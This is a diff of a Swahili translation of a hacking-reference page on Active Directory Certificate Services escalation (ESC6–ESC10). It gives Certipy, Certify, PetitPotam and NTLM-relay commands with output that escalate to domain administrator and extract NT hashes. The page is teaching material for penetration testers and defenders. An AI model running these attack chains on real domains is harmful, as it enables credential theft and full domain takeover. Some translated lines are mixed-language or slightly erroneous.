-> Baada ya masasisho ya usalama ya Mei 2022, **certificates** mpya zitakazotolewa zitakuwa na **security extension** inayojumuisha mali ya `objectSid` ya muombaji. Kwa ESC1, SID hii hutokana na SAN iliyotajwa. Hata hivyo, kwa **ESC6**, SID inafanana na `objectSid` ya muombaji, si SAN.\
-> Ili kutekeleza ESC6, ni muhimu mfumo uwe dhaifu kwa ESC10 (Weak Certificate Mappings), ambayo inaipa kipaumbele **SAN juu ya security extension mpya**.
+> Baada ya sasisho za usalama za Mei 2022, **vyeti** vipya vita kuwa na **extension ya usalama** inayoingiza **mali ya `objectSid` ya muombaji**. Kwa ESC1, SID hii inatokana na SAN iliyotajwa. Hata hivyo, kwa **ESC6**, SID inaakisi **`objectSid` ya muombaji**, si SAN.\
+> Ili kukitumia ESC6, ni muhimu mfumo uwe unayoweza kuathiriwa na ESC10 (Weak Certificate Mappings), ambayo inaipa kipaumbele **SAN kuliko extension mpya ya usalama**.
 
 ## Vulnerable Certificate Authority Access Control - ESC7
 
-### Shambulio 1
+### Attack 1
 
-#### Ufafanuzi
+#### Explanation
 
-Udhibiti wa ufikiaji kwa certificate authority unaendeshwa kupitia seti ya ruhusa zinazodhibiti vitendo vya CA. Ruhusa hizi zinaweza kuonekana kwa kufungua `certsrv.msc`, kubonyeza-kulia CA, kuchagua properties, kisha kuvinjari kwenye Security tab. Zaidi ya hayo, ruhusa zinaweza kuorodheshwa kwa kutumia module ya PSPKI na amri kama:
+Udhibiti wa ufikiaji wa certificate authority unadumishwa kupitia seti ya ruhusa zinazodhibiti vitendo vya CA. Ruhusa hizi zinaweza kuonekana kwa kufungua `certsrv.msc`, kubofya kwa kitufe cha kulia kwenye CA, kuchagua properties, kisha kwenda kwenye kichupo cha Security. Zaidi ya hayo, ruhusa zinaweza kuorodheshwa kwa kutumia module ya PSPKI kwa amri kama:
 ```bash
 Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
 ```
-Hili linatoa ufahamu kuhusu haki kuu, yaani **`ManageCA`** na **`ManageCertificates`**, zinazolingana na majukumu ya “CA administrator” na “Certificate Manager” mtawaliwa.
+Hii inatoa ufahamu kuhusu haki kuu, yaani **`ManageCA`** na **`ManageCertificates`**, zinazolingana na majukumu ya “msimamizi wa CA” na “Meneja wa Vyeti” mtawalia.
 
-#### Matumizi mabaya
+#### Abuse
 
-Kuwa na haki za **`ManageCA`** kwenye certificate authority kunamwezesha mhusika kubadilisha mipangilio kwa mbali kwa kutumia PSPKI. Hii inajumuisha kuwasha/kuzima bendera ya **`EDITF_ATTRIBUTESUBJECTALTNAME2`** ili kuruhusu maalumisho ya SAN katika template yoyote, jambo la muhimu kwa kupandisha hadhi kwenye domain.
+Kuwa na haki za **`ManageCA`** kwenye certificate authority kunamruhusu mhusika kubadilisha mipangilio kwa mbali kwa kutumia PSPKI. Hii inajumuisha kuwasha au kuzima bendera ya **`EDITF_ATTRIBUTESUBJECTALTNAME2`** ili kuruhusu utoaji wa SAN kwenye template yoyote, jambo muhimu katika domain escalation.
 
-Kupunguza ugumu wa mchakato huu kunawezekana kwa kutumia cmdlet ya PSPKI **Enable-PolicyModuleFlag**, ikiruhusu mabadiliko bila kuingiliana na GUI moja kwa moja.
+Kurahisisha mchakato huu kunawezekana kwa kutumia cmdlet ya PSPKI **Enable-PolicyModuleFlag**, ikiruhusu mabadiliko bila kuingiliana moja kwa moja na GUI.
 
-Kuwa na haki za **`ManageCertificates`** kunarahisisha kuidhinisha maombi yanayosubiri, kwa ufanisi kukwepa kizuizi cha "CA certificate manager approval".
+Kumiliki haki za **`ManageCertificates`** kunarahisisha kuidhinishwa kwa maombi yaliyo katika kusubiri, kwa ufanisi kupita juu ya kinga ya "CA certificate manager approval".
 
-Mchanganyiko wa moduli za **Certify** na **PSPKI** unaweza kutumika kutuma ombi, kuidhinisha, na kupakua cheti:
+Mchanganyiko wa moduli za **Certify** na **PSPKI** unaweza kutumika kuomba, kuidhinisha, na kupakua cheti:
 ```bash
 # Request a certificate that will require an approval
 Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
@@ -269,28 +269,28 @@ Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
 #### Maelezo
 
 > [!WARNING]
-> Katika **shambulio lililotangulia** ruhusa za **`Manage CA`** zilitumika ili **kuwezeshwa** bendera ya **EDITF_ATTRIBUTESUBJECTALTNAME2** kufanya **ESC6 attack**, lakini hii haitakuwa na athari hadi huduma ya CA (`CertSvc`) irejeshwe upya. Mtu anapokuwa na haki ya kufikia `Manage CA`, pia anaruhusiwa **kurejesha huduma**. Hata hivyo, hii **haimaanishi kuwa mtumiaji anaweza kurejesha huduma kwa umbali**. Zaidi ya hayo, **ESC6 might not work out of the box** katika mazingira mengi yaliyopigwa patches kutokana na May 2022 security updates.
+> Katika **shambulio lililopita** ruhusa za **`Manage CA`** zilitumiwa **kuwezesha** bendera **EDITF_ATTRIBUTESUBJECTALTNAME2** ili kutekeleza **ESC6 attack**, lakini hili haitaathiri hadi huduma ya CA (`CertSvc`) ianze upya. Wakati mtumiaji ana haki ya ufikiaji ya `Manage CA`, mtumiaji pia ameruhusiwa **kuanzisha upya huduma**. Hata hivyo, hii **haimaanishi kwamba mtumiaji anaweza kuanzisha upya huduma kwa mbali**. Zaidi ya hayo, E**SC6 huenda isifanyi kazi moja kwa moja** katika mazingira mengi yaliyosafishwa kutokana na masasisho ya usalama ya Mei 2022.
 
-Kwa hivyo, shambulio mwingine linaonyeshwa hapa.
+Kwa hivyo, shambulio lingine linaonyeshwa hapa.
 
-Mahitaji ya awali:
+Mahitaji:
 
-- Tu ruhusa ya **`ManageCA`**
-- Ruhusa ya **`Manage Certificates`** (inaweza kutolewa kutoka **`ManageCA`**)
-- Template ya cheti **`SubCA`** lazima iwe **imewezeshwa** (inaweza kuwezeshwa kutoka **`ManageCA`**)
+- Tu **`ManageCA` permission**
+- Ruhusa ya **`Manage Certificates`** (inaweza kutolewa na **`ManageCA`**)
+- Templeti ya cheti **`SubCA`** lazima iwe **imewezeshwa** (inaweza kuwezeshwa na **`ManageCA`**)
 
-Mbinu inategemea ukweli kwamba watumiaji wenye haki za kufikia `Manage CA` _na_ `Manage Certificates` wanaweza **kuwasilisha maombi ya cheti yaliyokataa**. Template ya cheti ya **`SubCA`** ni **nyeti kwa ESC1**, lakini **wabunifu pekee** wanaweza kujiandikisha kwenye template. Hivyo, **mtumiaji** anaweza **kuomba** kujiandikisha kwa **`SubCA`** - ambalo litatupiliwa mbali - lakini **baadaye litatolewa na msimamizi**.
+Mbinu inategemea ukweli kwamba watumiaji wenye haki za ufikiaji za `Manage CA` _na_ `Manage Certificates` wanaweza **kuwasilisha maombi ya cheti yatakayokataa**. Templeti ya cheti ya **`SubCA`** ni **dhaifu dhidi ya ESC1**, lakini **wasimamizi pekee** wanaweza kujisajili kwenye templeti. Hivyo, **mtumiaji** anaweza **kuomba** kujiandikisha katika **`SubCA`** - ambalo litakataliwa - lakini **kisha litolewe na meneja baadaye**.
 
-#### Matumizi mabaya
+#### Kutumia vibaya
 
-Unaweza kujipa mwenyewe haki ya kufikia **`Manage Certificates`** kwa kuongeza mtumiaji wako kama afisa mpya.
+Unaweza **kujipa haki ya ufikiaji ya `Manage Certificates`** kwa kuongeza mtumiaji wako kama afisa mpya.
 ```bash
 certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 [*] Successfully added officer 'John' on 'corp-DC-CA'
 ```
-Kiolezo cha **`SubCA`** kinaweza **kuwezeshwa kwenye CA** kwa kutumia parameter `-enable-template`. Kwa chaguo-msingi, kiolezo cha `SubCA` kimewezeshwa.
+Template ya **`SubCA`** inaweza **kuwezeshwa kwenye CA** kwa kutumia parameter `-enable-template`. Kwa chaguo-msingi, template ya `SubCA` imewezeshwa.
 ```bash
 # List templates
 certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
@@ -302,9 +302,9 @@ Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 [*] Successfully enabled 'SubCA' on 'corp-DC-CA'
 ```
-Ikiwa tumezingatia vigezo vya awali kwa shambulio hili, tunaweza kuanza kwa **kuomba cheti kwa kutumia template ya `SubCA`**.
+Ikiwa tumekamilisha vigezo vya awali kwa shambulio hili, tunaweza kuanza kwa **kuomba cheti kulingana na kiolezo cha `SubCA`**.
 
-**Ombi hili litatataliwa**, lakini tutajihifadhi private key na kurekodi request ID.
+**Ombi hili litakataa**, lakini tutahifadhi private key na kurekodi request ID.
 ```bash
 certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
@@ -316,14 +316,14 @@ Would you like to save the private key? (y/N) y
 [*] Saved private key to 785.key
 [-] Failed to request certificate
 ```
-Kwa **`Manage CA` na `Manage Certificates`**, tunaweza kisha **kutoa ombi la cheti lililoshindikana** kwa kutumia amri `ca` na kipengele `-issue-request <request ID>`.
+Kwa **`Manage CA` na `Manage Certificates`**, tunaweza kisha **kutoa ombi la cheti lililoshindwa** kwa amri ya `ca` na kigezo cha `-issue-request <request ID>`.
 ```bash
 certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 [*] Successfully issued certificate
 ```
-Na hatimaye, tunaweza **kupata cheti kilichotolewa** kwa kutumia amri ya `req` na kipengele `-retrieve <request ID>`.
+Na hatimaye, tunaweza **kupata cheti kilichotolewa** kwa amri ya `req` na kigezo `-retrieve <request ID>`.
 ```bash
 certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
@@ -339,63 +339,65 @@ Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 #### Maelezo
 
-Mbali na matumizi ya jadi ya ESC7 (kuwezesha sifa za EDITF au kuidhinisha maombi yanayosubiri), **Certify 2.0** ilibaini primitive mpya inayohitaji tu jukumu la *Manage Certificates* (a.k.a. **Certificate Manager / Officer**) kwenye Enterprise CA.
+Mbali na matumizi mabaya ya kawaida ya ESC7 (kuwezesha EDITF attributes au kuidhinisha pending requests), **Certify 2.0** iligundua primitive mpya kabisa inayohitaji tu jukumu la *Manage Certificates* (pia inajulikana kama **Certificate Manager / Officer**) kwenye Enterprise CA.
 
-The `ICertAdmin::SetExtension` RPC method inaweza kutekelezwa na yoyote principal anayemiliki *Manage Certificates*. Wakati method kawaida ilitumika na CAs halali kusasisha extensions kwenye maombi **yanayosubiri**, mshambuliaji anaweza kuitapeli ili **kuongeza *non-default* certificate extension** (kwa mfano custom *Certificate Issuance Policy* OID kama `1.1.1.1`) kwenye ombi linalosubiri idhini.
+Njia ya RPC `ICertAdmin::SetExtension` inaweza kutekelezwa na yeyote anayeshikilia *Manage Certificates*. Wakati njia hiyo ilitumika jadi na CAs halali kusasisha extensions kwenye **pending** requests, mshambuliaji anaweza kuitumia vibaya kuongeza ***non-default* certificate extension** (kwa mfano custom *Certificate Issuance Policy* OID kama `1.1.1.1`) kwenye ombi linalosubiri idhini.
 
-Kwa sababu template inayolengwa haijaweka thamani ya default kwa extension hiyo, CA haitafunika thamani iliyodhibitiwa na mshambuliaji wakati ombi litakapotozwa. Kwa hivyo cheti kilichotolewa kina extension iliyochaguliwa na mshambuliaji ambayo inaweza:
+Kwa sababu template iliyolengwa haifafanui thamani ya default kwa extension hiyo, CA haitaboresha au kuandika juu thamani iliyowekwa na mshambuliaji wakati ombi litakapotozwa. Hivyo basi cheti kilichotolewa kina extension iliyochaguliwa na mshambuliaji ambayo inaweza:
 
-* Kutosheleza masharti ya Application / Issuance Policy ya templates nyingine zilizo hatarini (kunaweza kusababisha privilege escalation).
+* Kutosheleza mahitaji ya Application / Issuance Policy ya templates nyingine zilizo hatarini (kupelekea privilege escalation).
 * Kuingiza EKUs au sera za ziada zinazompa cheti uaminifu usiotarajiwa katika mifumo ya wahusika wa tatu.
 
-Kwa kifupi, *Manage Certificates* – ambayo awali ilichukuliwa kama nusu “isiyo na nguvu” ya ESC7 – sasa inaweza kutumika kwa privilege escalation kamili au persistence ya muda mrefu, bila kugusa usanidi wa CA au kuhitaji haki kali ya *Manage CA*.
+Kwa ufupi, *Manage Certificates* – ambayo hapo awali ilionekana kama nusu "isiyo na nguvu" ya ESC7 – sasa inaweza kutumika kwa full privilege escalation au persistence ya muda mrefu, bila kugusa usanidi wa CA au kuhitaji haki ngumu ya *Manage CA*.
 
-#### Kutumia primitive kwa udanganyifu na Certify 2.0
+#### Kutumia primitive vibaya na Certify 2.0
 
-1. **Wasilisha ombi la cheti ambalo litaendelea kuwa *pending*.** Hii inaweza kufanywa kwa template inayohitaji idhini ya meneja:
+1. **Tuma ombi la cheti litakalobaki *pending*.** Hii inaweza kulazimishwa kwa template inayohitaji idhini ya meneja:
 ```powershell
 Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
 # Take note of the returned Request ID
 ```
 
-2. **Ongeza extension maalum kwenye ombi linalosubiri** ukitumia amri mpya ya `manage-ca`:
+2. **Ongeza extension maalum kwenye ombi lililosubiri** kwa kutumia amri mpya ya `manage-ca`:
 ```powershell
 Certify.exe manage-ca --ca SERVER\\CA-NAME \
 --request-id 1337 \
 --set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
 ```
-*If the template does not already define the *Certificate Issuance Policies* extension, the value above will be preserved after issuance.*
+*Ikiwa template haijatofautisha tayari *Certificate Issuance Policies* extension, thamani hapo juu itahifadhiwa baada ya utoaji.*
 
-3. **Toza ombi** (kama jukumu lako pia lina haki za idhini za *Manage Certificates*) au subiri operator kuuliidhinisha. Mara itakapotolewa, pakua cheti:
+3. **Toa ombi** (ikiwa jukumu lako pia lina haki za kuidhinisha *Manage Certificates*) au subiri operator kuuiidhinisha. Mara utakapotoa, pakua cheti:
 ```powershell
 Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
 ```
 
-4. Cheti kilichopatikana sasa kina malicious issuance-policy OID na kinaweza kutumika katika mashambulio yanayofuata (mfano ESC13, domain escalation, nk).
+4. Cheti kilichopatikana sasa kina OID ya issuance-policy yenye madhara na kinaweza kutumika katika mashambulio yanayofuata (mfano ESC13, domain escalation, n.k.).
 
-Kumbuka: Shambulio sawa linaweza kutekelezwa na Certipy ≥ 4.7 kupitia amri ya `ca` na parameter `-set-extension`.
+> KUMBUKUMBU: Shambulio sawa linaweza kutekelezwa na Certipy ≥ 4.7 kupitia amri `ca` na parameter `-set-extension`.
 
-## NTLM Relay kwa AD CS HTTP Endpoints – ESC8
+## NTLM Relay to AD CS HTTP Endpoints – ESC8
 
 ### Maelezo
 
 > [!TIP]
-> Katika mazingira ambapo **AD CS imewekwa**, ikiwa kuna **web enrollment endpoint iliyo hatarini** na angalau moja **certificate template imechapishwa** inayoruhusu **domain computer enrollment and client authentication** (kama template ya default **`Machine`**), inawezekana kwa **kompyuta yoyote yenye spooler service ikifanya kazi kuathiriwa na mshambuliaji**!
+> Katika mazingira ambapo **AD CS is installed**, ikiwa kuna **web enrollment endpoint vulnerable** na angalau template moja ya cheti imetangazwa inayoruhusu **domain computer enrollment and client authentication** (kama template ya default **`Machine`**), inakuwa inawezekana kwa **kompyuta yoyote yenye spooler service active kuathiriwa na mshambuliaji**!
 
-Njia kadhaa za **HTTP-based enrollment methods** zinatambuliwa na AD CS, zinazoletwa kupitia server roles za ziada ambazo wasimamizi wanaweza kusanidi. Interfaces hizi za HTTP-based certificate enrollment zinaweza kuathiriwa na **NTLM relay attacks**. Mshambuliaji kutoka kwenye **kompyuta iliyodukuliwa, anaweza kujifanya kama akaunti yoyote ya AD inayothibitishwa kupitia inbound NTLM**. Akijifanya kuwa akaunti ya mwathiriwa, interface hizi za wavuti zinaweza kufikiwa na mshambuliaji kuomba cheti cha client authentication kwa kutumia `User` au `Machine` certificate templates.
+AD CS inasaidia njia kadhaa za **HTTP-based enrollment methods**, zinazopatikana kupitia server roles za ziada ambazo wasimamizi wanaweza kusakinisha. Interfaces hizi za HTTP-based certificate enrollment zinaweza kuathiriwa na **NTLM relay attacks**. Mshambuliaji, kutoka kwenye **compromised machine**, anaweza kuiga akaunti yoyote ya AD inayothibitishwa kupitia inbound NTLM. Wakati akiiga akaunti ya mwathiriwa, interface hizi za wavuti zinaweza kufikiwa na mshambuliaji kuomba **client authentication certificate using the `User` or `Machine` certificate templates**.
 
-- The **web enrollment interface** (programu ya zamani ya ASP inayopatikana kwenye `http://<caserver>/certsrv/`), kwa kawaida inatumia tu HTTP, ambayo haitoleti ulinzi dhidi ya NTLM relay attacks. Zaidi ya hayo, inaruhusu wazi tu NTLM kupitia Authorization HTTP header, ikifanya njia za uthibitishaji salama zaidi kama Kerberos zisifae.
-- The **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service, na **Network Device Enrollment Service** (NDES) kwa kawaida zinasaidia negotiate authentication kupitia Authorization HTTP header zao. Negotiate authentication **inaunga mkono** Kerberos na **NTLM**, na kuruhusu mshambuliaji **kubana hadi NTLM** wakati wa relay attacks. Ingawa web services hizi zinawezeshwa HTTPS kwa chaguo-msingi, HTTPS peke yake **haitaiweka kinga dhidi ya NTLM relay attacks**. Ulinzi dhidi ya NTLM relay kwa huduma za HTTPS unapatikana csak wakati HTTPS inachanganywa na channel binding. Kwa bahati mbaya, AD CS haitumiwi Extended Protection for Authentication kwenye IIS, ambayo inahitajika kwa channel binding.
+- The **web enrollment interface** (an older ASP application available at `http://<caserver>/certsrv/`), defaults to HTTP only, which does not offer protection against NTLM relay attacks. Additionally, it explicitly permits only NTLM authentication through its Authorization HTTP header, rendering more secure authentication methods like Kerberos inapplicable.
+- The **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service, and **Network Device Enrollment Service** (NDES) kwa default zinaunga mkono negotiate authentication kupitia Authorization HTTP header zao. Negotiate authentication inasaidia **both** Kerberos na **NTLM**, kuruhusu mshambuliaji **kudowngrade hadi NTLM** authentication wakati wa relay attacks. Ingawa huduma hizi za wavuti zinaweza kuweka HTTPS kwa default, HTTPS pekee **haitalinda dhidi ya NTLM relay attacks**. Ulinzi dhidi ya NTLM relay attacks kwa huduma za HTTPS unapatikana tu pale HTTPS inapotumika pamoja na channel binding. Kwa bahati mbaya, AD CS haizimei Extended Protection for Authentication kwenye IIS, ambayo inahitajika kwa channel binding.
 
-Tatizo la kawaida na NTLM relay attacks ni **muda mfupi wa vikao vya NTLM** na kutokuwa na uwezo wa mshambuliaji kuingiliana na huduma zinazohitaji **NTLM signing**.
+Tatizo la kawaida kwa NTLM relay attacks ni **muda mfupi wa vikao vya NTLM** na kushindwa kwa mshambuliaji kuingiliana na huduma zinazohitaji **NTLM signing**.
 
-Hata hivyo, kizuizi hiki kinaweza kushinda kwa kutumia NTLM relay attack kupata cheti kwa mtumiaji, kwani kipindi cha uhalali cha cheti ndicho kinachoamua muda wa kikao, na cheti kinaweza kutumika na huduma zinazohitaji **NTLM signing**. Kwa maelekezo juu ya kutumia cheti kilichoporwa, rejea:
+Hata hivyo, kikomo hiki kinaweza kushindwa kwa kutumia NTLM relay attack kupata cheti kwa mtumiaji, kwa kuwa muda wa uhalali wa cheti ndio unaodhibiti muda wa kikao, na cheti kinaweza kutumika na huduma zinazolazimisha **NTLM signing**. Kwa maagizo ya kutumia cheti kilichoibiwa, rejea:
+
 
 {{#ref}}
 account-persistence.md
 {{#endref}}
 
-Kizuizi kingine cha NTLM relay attacks ni kwamba **kompyuta inayodhibitiwa na mshambuliaji lazima ithibitishwe nayo na akaunti ya mwathiriwa**. Mshambuliaji anaweza kusubiri au kujaribu **kulazimisha** uthibitisho huu:
+Kikomo kingine cha NTLM relay attacks ni kwamba **kompyuta inayodhibitiwa na mshambuliaji lazima ithibitishwe na akaunti ya mwathiriwa**. Mshambuliaji anaweza kusubiri au kujaribu **kulazimisha** uthibitishaji huu:
+
 
 {{#ref}}
 ../printers-spooler-service-abuse.md
@@ -403,13 +405,13 @@ Kizuizi kingine cha NTLM relay attacks ni kwamba **kompyuta inayodhibitiwa na ms
 
 ### **Matumizi mabaya**
 
-[**Certify**](https://github.com/GhostPack/Certify)’s `cas` enumerates **enabled HTTP AD CS endpoints**:
+Amri `cas` ya [**Certify**](https://github.com/GhostPack/Certify) inoorodhesha **enabled HTTP AD CS endpoints**:
 ```
 Certify.exe cas
 ```
 <figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>
 
-Propati ya `msPKI-Enrollment-Servers` inatumiwa na Certificate Authorities (CAs) za shirika kuhifadhi endpoints za Certificate Enrollment Service (CES). Endpoints hizi zinaweza kuchambuliwa na kuorodheshwa kwa kutumia chombo **Certutil.exe**:
+Mali `msPKI-Enrollment-Servers` hutumika na Mamlaka za Vyeti za kibiashara (CAs) kuhifadhi endpoints za Certificate Enrollment Service (CES). Endpoints hizi zinaweza kuchambuliwa na kutolewa orodha kwa kutumia chombo **Certutil.exe**:
 ```
 certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
 ```
@@ -420,7 +422,7 @@ Get-CertificationAuthority | select Name,Enroll* | Format-List *
 ```
 <figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>
 
-#### Kutumia Certify vibaya
+#### Matumizi mabaya ya Certify
 ```bash
 ## In the victim machine
 # Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
@@ -437,9 +439,9 @@ execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <
 ```
 #### Matumizi mabaya na [Certipy](https://github.com/ly4k/Certipy)
 
-Ombi la cheti linafanywa na Certipy kwa chaguo-msingi kulingana na template `Machine` au `User`, ambalo linaamuliwa na ikiwa jina la akaunti linalohamishwa linaisha kwa `$`. Uainishaji wa template mbadala unaweza kufanywa kwa kutumia parameter `-template`.
+Ombi la cheti linatolewa na Certipy kwa chaguo-msingi kulingana na template `Machine` au `User`, linaloamuliwa na ikiwa jina la akaunti linalorelay linamalizika kwa `$`. Ufafanuzi wa template mbadala unaweza kufikiwa kwa kutumia parameter `-template`.
 
-Mbinu kama [PetitPotam](https://github.com/ly4k/PetitPotam) inaweza kisha kutumika kulazimisha uthibitishaji. Unaposhughulika na wadhibiti wa domain, uainishaji wa `-template DomainController` unahitajika.
+Mbinu kama [PetitPotam](https://github.com/ly4k/PetitPotam) inaweza kisha kutumika kulazimisha uthibitishaji. Unapotegemea domain controllers, ufafanuzi wa `-template DomainController` unahitajika.
 ```bash
 certipy relay -ca ca.corp.local
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
@@ -452,44 +454,44 @@ Certipy v4.0.0 - by Oliver Lyak (ly4k)
 [*] Saved certificate and private key to 'administrator.pfx'
 [*] Exiting...
 ```
-## Hakuna Kiongezi cha Usalama - ESC9 <a href="#id-5485" id="id-5485"></a>
+## Hakuna Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>
 
 ### Maelezo
 
-Thamani mpya **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) kwa **`msPKI-Enrollment-Flag`**, inayoitwaje ESC9, inazuia kuingizwa kwa **ongezo jipya la usalama `szOID_NTDS_CA_SECURITY_EXT`** kwenye cheti. Bendera hii inakuwa muhimu wakati `StrongCertificateBindingEnforcement` imewekwa kuwa `1` (usanidi wa chaguo-msingi), tofauti na usanidi wa `2`. Umuhimu wake unaongezeka katika matukio ambapo ramani dhaifu ya cheti kwa Kerberos au Schannel inaweza kutumiwa vibaya (kama ilivyo kwa ESC10), kwani kukosekana kwa ESC9 hakutabadilisha mahitaji.
+Thamani mpya **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) kwa **`msPKI-Enrollment-Flag`**, inayojulikana kama ESC9, inazuia kuingizwa kwa **nyongeza mpya ya usalama `szOID_NTDS_CA_SECURITY_EXT`** katika cheti. Bendera hii inakuwa muhimu wakati `StrongCertificateBindingEnforcement` imewekwa kwa `1` (chaguo-msingi), tofauti na usanidi wa `2`. Umuhimu wake unaongezeka katika matukio ambapo ramu dhaifu ya cheti kwa Kerberos au Schannel inaweza kutumika kinyume (kama ilivyo kwa ESC10), kwani kutokuwepo kwa ESC9 hautabadili mahitaji.
 
-Masharti yanayofanya usanidi wa bendera hii kuwa muhimu ni pamoja na:
+Masharti ambapo usanidi wa bendera hii unakuwa muhimu ni pamoja na:
 
-- `StrongCertificateBindingEnforcement` haijorekebishwa kuwa `2` (ikiwa chaguo-msingi ni `1`), au `CertificateMappingMethods` inaongeza bendera ya `UPN`.
-- Cheti kimewekwa alama na bendera ya `CT_FLAG_NO_SECURITY_EXTENSION` ndani ya usanidi wa `msPKI-Enrollment-Flag`.
-- EKU yoyote ya uthibitisho wa mteja imeteuliwa kwenye cheti.
-- Ruhusa za `GenericWrite` zinapatikana juu ya akaunti yoyote ili kuharibu nyingine.
+- `StrongCertificateBindingEnforcement` haijarekebishwa kuwa `2` (chaguo-msingi ni `1`), au `CertificateMappingMethods` inajumuisha bendera ya `UPN`.
+- Cheti kimewekwa alama na bendera `CT_FLAG_NO_SECURITY_EXTENSION` ndani ya usanidi wa `msPKI-Enrollment-Flag`.
+- EKU yoyote ya uthibitishaji wa mteja imeainishwa kwenye cheti.
+- Ruhusa za `GenericWrite` zinapatikana juu ya akaunti yoyote ili kupata udhibiti wa akaunti nyingine.
 
 ### Mfano wa Matumizi Mabaya
 
-Tuseme `John@corp.local` ana ruhusa za `GenericWrite` juu ya `Jane@corp.local`, akiwa na lengo la kumdhibiti `Administrator@corp.local`. Kiolezo cha cheti cha `ESC9`, ambacho `Jane@corp.local` ameruhusiwa kujiandikisha nacho, kimewekwa na bendera ya `CT_FLAG_NO_SECURITY_EXTENSION` katika usanidi wake wa `msPKI-Enrollment-Flag`.
+Tuseme `John@corp.local` ana ruhusa za `GenericWrite` juu ya `Jane@corp.local`, akiwa na lengo la kudhoofisha `Administrator@corp.local`. Kiambatisho cha cheti cha `ESC9`, ambacho `Jane@corp.local` ana ruhusa ya kujiandikisha kwake, kimewekwa na bendera `CT_FLAG_NO_SECURITY_EXTENSION` katika usanidi wake wa `msPKI-Enrollment-Flag`.
 
-Mwanzo, hash ya `Jane` inapatikana kwa kutumia Shadow Credentials, kwa sababu ya `GenericWrite` ya `John`:
+Mwanzo, hash ya `Jane` inapatikana kwa kutumia Shadow Credentials, shukrani kwa `GenericWrite` ya `John`:
 ```bash
 certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
 ```
-Baadaye, `userPrincipalName` ya `Jane` imebadilishwa kuwa `Administrator`, kwa makusudi ikiacha sehemu ya kikoa `@corp.local`:
+Baadaye, `userPrincipalName` ya `Jane` imebadilishwa kuwa `Administrator`, kwa makusudi ikiacha sehemu ya domain `@corp.local`:
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
 ```
-Marekebisho haya hayivunji vikwazo, kwa kuwa `Administrator@corp.local` bado ni tofauti kama `userPrincipalName` ya Administrator.
+Marekebisho haya hayavunji vizingiti, ikizingatiwa kuwa `Administrator@corp.local` bado ni tofauti kama `Administrator`'s `userPrincipalName`.
 
-Baada ya hayo, kiolezo cha cheti `ESC9`, kilichotajwa kama dhaifu, kimeombwa kama `Jane`:
+Baada ya hayo, template ya cheti `ESC9`, iliyotajwa kama dhaifu, imeombwa kama `Jane`:
 ```bash
 certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
 ```
-Imebainika kuwa `userPrincipalName` ya cheti inaonyesha `Administrator`, bila kuwa na “object SID” yoyote.
+Imebainika kuwa `userPrincipalName` ya cheti inaonyesha `Administrator`, bila ya “object SID” yoyote.
 
-`userPrincipalName` ya `Jane` kisha inarudishwa kwa asili yake, `Jane@corp.local`:
+`userPrincipalName` ya `Jane` kisha inarejeshwa kwa asili yake, `Jane@corp.local`:
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
 ```
-Kujaribu uthibitisho kwa kutumia cheti kilichotolewa sasa kunatoa NT hash ya `Administrator@corp.local`. Amri lazima ijumlishe `-domain <domain>` kutokana na cheti kukosa uainishaji wa domain:
+Kujaribu uthibitishaji kwa kutumia cheti kilichotolewa sasa kunaleta hash ya NT ya `Administrator@corp.local`. Amri lazima ijumuishe `-domain <domain>` kutokana na cheti kutokuwa na ufafanuzi wa domaini:
 ```bash
 certipy auth -pfx adminitrator.pfx -domain corp.local
 ```
@@ -499,28 +501,28 @@ certipy auth -pfx adminitrator.pfx -domain corp.local
 
 Thamani mbili za registry kwenye domain controller zinatajwa na ESC10:
 
-- Thamani ya chaguo-msingi ya `CertificateMappingMethods` under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` ni `0x18` (`0x8 | 0x10`), hapo awali ilipangwa kuwa `0x1F`.
-- Mipangilio ya chaguo-msingi ya `StrongCertificateBindingEnforcement` under `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` ni `1`, hapo awali `0`.
+- Thamani ya default ya `CertificateMappingMethods` katika `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` ni `0x18` (`0x8 | 0x10`), kabla ilikuwa imewekwa kuwa `0x1F`.
+- Mipangilio ya default ya `StrongCertificateBindingEnforcement` katika `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` ni `1`, kabla ni `0`.
 
-### Kesi 1
